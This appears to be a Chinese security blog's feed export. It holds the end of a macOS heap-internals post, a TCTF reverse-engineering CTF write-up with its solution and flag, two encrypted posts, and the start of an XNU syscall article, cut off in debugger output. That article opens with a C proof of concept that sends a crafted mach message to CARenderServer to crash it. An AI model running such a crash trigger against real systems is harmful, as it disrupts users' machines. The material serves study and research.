MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 